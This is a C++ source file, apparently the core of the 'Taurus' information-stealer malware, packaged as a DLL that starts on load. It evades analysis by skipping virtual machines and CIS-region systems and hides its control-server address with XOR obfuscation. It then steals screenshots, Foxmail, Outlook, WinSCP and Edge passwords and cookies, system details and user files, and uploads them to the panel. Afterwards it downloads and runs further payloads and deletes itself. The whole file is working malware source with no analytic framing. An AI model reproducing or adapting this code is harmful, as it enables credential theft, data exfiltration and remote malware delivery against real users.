#include "../Taurus/Common.h"

namespace Stealer
{
	const string panelLink = XorStr(PANEL);
	constexpr unsigned int panel_hash = crc32_compile(PANEL);
	const DWORD panelPort = XorInt(PORT);

	SysInfo sysinfo;
	const string uid = sysinfo.GetUid();
	const string osVer = sysinfo.GetOs();
	const string BuildPrefix = XorStr(PREFIX);
}

void MainThread()
{

#ifdef RELEASE_BUILD
	if (Antis().IsCIS()) return;
#endif

	if (Stealer::panelLink.size() + XorInt(1) != XorInt(sizeof(PANEL))) return;
	if (crc32_run(Stealer::panelLink.c_str()) != Stealer::panel_hash) return;

	Stealing sender = Stealing(Stealer::panelLink, Stealer::panelPort, Stealer::uid, Stealer::osVer, Stealer::BuildPrefix);
	sender.SetWorkingPath();
	sender.config = sender.panel.GetConfig();
	DEBUG("Config getted...")

	if (sender.config.bAntiVm && Antis().IsVM()) return;

	if (sender.config.bScreenshot)
	{
		DEBUG("Getting screen...")
		vector<string> screens;
		Screenshot::Get(screens);

		size_t i = 0;
		for (string& screenData : screens)
		{
			string fileName = i ? XorStr("Screenshot_") + std::to_string(i) + XorStr(".png") : XorStr("Screenshot.png");
			sender.panel.AddFile(fileName, screenData);
			i++;
		}
	}

	if (sender.config.bFoxmail)
	{
		DEBUG("Getting foxmail...")
		PassData data = Foxmail::Grab();
		if (!data.Login.empty() || !data.Pass.empty())
		{
			sender.grabbedInfo.bFoxmail = true;
			sender.AddPass(data);
		}
	}

	if (sender.config.bOutlook)
	{
		DEBUG("Getting outlook...")
		vector<PassData> passData = Outlook::Grab();
		if (!passData.empty())
		{
			sender.grabbedInfo.bOutlook = true;
			for (PassData& data : passData)
			{
				sender.AddPass(data);
			}
		}
	}

	if (sender.config.bWinScp)
	{
		DEBUG("Getting winscp...")
		vector<PassData> passData = WinSCP::Grab();
		if (!passData.empty())
		{
			sender.grabbedInfo.bWinScp = true;
			for (PassData& data : passData)
			{
				sender.AddPass(data);
			}
		}
	}

	string grab_path = Utils::GetEnvVar(CRC32_STR("SystemDrive"));
	if (grab_path == "")
	{
		grab_path = XorStr("C:");
	}
	grab_path += XorStr("\\Users");

	sender.MainRec(grab_path);

	if (sender.config.bEdge)
	{
		DEBUG("Getting Edge info...")
		sender.GetEdgePasswords();
		sender.GetEdgeCookies();
	}

	if (sender.config.bSysInfo)
	{
		DEBUG("Getting system info...")
		SysInfo info(sender.config.IP, sender.config.Country);
		sender.panel.AddFile(XorStr("Info.txt"), info.BuildInfo());
	}

	if (!sender.config.FileGrabberConfig.empty())
	{
		DEBUG("Starting grabber...")
		FileGrabber filegrabber(&sender.panel, sender.config.MaxFilesSize * 1024);
		if (filegrabber.GetRules(sender.config.FileGrabberConfig))
		{
			if (!sender.passw_domains.empty()) filegrabber.ProcessDomains(sender.passw_domains);
			filegrabber.Grab();
		}
	}


	sender.BuildLogInfo();
	DEBUG("Log info builded")

	sender.panel.BuildLog();
	DEBUG("Log builded")

	DEBUG("Sending log...")
	bool bSended = sender.panel.SendLog();
	size_t attempts = 0;
	while (!bSended && attempts < 5)
	{
		DEBUG("Log sending error, retry...")
		bSended = sender.panel.SendLog();
		attempts++;
	}

	DEBUG("Log sended, cleanup..")
	sender.CleanUp(Stealer::panelLink);

	if (!sender.config.LoaderConfig.empty())
	{
		DEBUG("Starting loader..")
		Loader loader(Stealer::panelLink, Stealer::panelPort);
		if (loader.GetRules(sender.config.LoaderConfig))
		{
			if (!sender.passw_domains.empty()) loader.ProcessDomains(sender.passw_domains);
			loader.DownloadExecute(sender.IsCryptoExist());
		}
	}

	if (sender.config.bSelfDel)
	{
		DEBUG("Complete, self delete...")
		Utils::SelfDel();
	}
}

extern "C" __declspec(dllexport) DWORD DllThread()
{
	MainThread();
	return 0;
}

extern "C" __declspec(dllexport) BOOL APIENTRY DllMain(HMODULE moduleHandle, DWORD reason, LPVOID reserved)
{
	switch (reason)
	{
	case DLL_PROCESS_ATTACH:
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DllThread, 0, 0, 0);
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}